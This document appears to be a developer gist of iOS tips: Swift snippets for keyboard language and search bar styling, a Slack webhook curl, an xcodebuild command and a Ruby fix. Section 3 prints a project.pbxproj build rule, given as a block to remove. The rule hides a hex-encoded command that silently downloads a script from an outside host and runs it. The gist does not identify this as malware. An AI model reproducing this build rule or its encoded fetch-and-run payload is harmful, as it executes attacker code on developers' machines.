# super-duper-robot-gist

## 1. To change the keyboard language programmatically
#### NOTE: - Keyboard must be added in the device
```swift
// To change the keyboard language programmatically
class CustomTextField: UITextField {
    private func getKeyboardLanguage() -> String? {
        return "ur" // here you can choose keyboard any way you need
    }
    override var textInputMode: UITextInputMode? {
        if let language = getKeyboardLanguage() {
            for tim in UITextInputMode.activeInputModes {
                if tim.primaryLanguage!.contains(language) {
                    return tim
                }
            }
        }
        return super.textInputMode
    }
}
```

## 2. UISearchBar Customizations
````swift
//MARK: - UISearchBarDelegate
extension SearchVC: UISearchBarDelegate {
    // SearchBar Properties
    func SearchBarCustomization(){
        searchBar.scopeBarBackgroundImage = UIImage()
        searchBar.backgroundImage = UIImage()
        var searchTextField : UITextField?
        if #available(iOS 13.0, *) {
            searchTextField = searchBar.searchTextField
        } else {
            // Fallback on earlier versions
            if let matchingTextField = searchBar.subviews[0].subviews.compactMap ({ $0 as? UITextField }).first {
                searchTextField = matchingTextField
            }
        }
        guard let validTextField = searchTextField else { return }
        let image:UIImage = UIImage(named: "ic_iconSearch")!
        let imageView:UIImageView = UIImageView.init(image: image)
        imageView.contentMode = .scaleAspectFit
        validTextField.leftView = imageView
        validTextField.layer.cornerRadius = 6
        validTextField.layer.borderWidth = 1.0
        validTextField.layer.borderColor = #colorLiteral(red: 0.9058823529, green: 0.9058823529, blue: 0.9058823529, alpha: 1)
        validTextField.backgroundColor = .white
        validTextField.font = UIFont(name: APP_FONT.buenosAiresBook.rawValue, size: 14)
//        var bounds: CGRect
//        bounds = validTextField.frame
//        bounds.size.height = 60 //(set height whatever you want)
//        validTextField.bounds = bounds
        let cancelButtonAttributes = [NSAttributedString.Key.foregroundColor: UIColor.black]
        UIBarButtonItem.appearance().setTitleTextAttributes(cancelButtonAttributes , for: .normal)
        searchBar.becomeFirstResponder()
    }
    
    // searchBarCancelButtonClicked
    func searchBarCancelButtonClicked(_ searchBar: UISearchBar) {
        self.navigationController?.popViewController(animated: false)
    }
    
    // textDidChange
    func searchBar(_ searchBar: UISearchBar, textDidChange searchText: String) {
        let text = searchBar.text ?? ""
        // todo
    }
    
    // searchBarSearchButtonClicked
    func searchBarSearchButtonClicked(_ searchBar: UISearchBar) {
        searchBar.resignFirstResponder()
    }
}
````

## 3. Remove this code block if unable to update the appIcon
```swift
YouProject.xcodeproj -> Show Package Contents -> project.pbxproj -> open

and find out the code and remove this block and build and run your app.

/ Begin PBXBuildRule section /
        EAB5E0C4DCACB35CE26D902C / PBXBuildRule / = {
            isa = PBXBuildRule;
            compilerSpec = com.apple.compilers.proxy.script;
            fileType = folder.assetcatalog;
            inputFiles = (
            );
            isEditable = 0;
            name = "Assets Catalog Builder";
            outputFiles = (
                "$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
            );
            script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
        };
/ End PBXBuildRule section /
```

## 4. Redirect logs to slack
````shell
curl -X POST --data-urlencode "payload={\"channel\": \"#channelname here\", \"username\": \"username here\", \"text\": \"message here\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/apikey
````

## 5. Building iOS project from CLI (command line)
````shell
xcodebuild -scheme "schemeName" -allowProvisioningUpdates -destination generic/platform=iOS -derivedDataPath "./build" build-for-testing
````

## 6. If getting error with ruby permissions
ERROR: While executing gem ... (Gem::FilePermissionError)
You don't have write permissions for the /System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/gems/2.6.0 directory.

Use this link: https://telliott.io/2015/10/14/using-rbenv-for-cocoapods-post-el-capitan.html
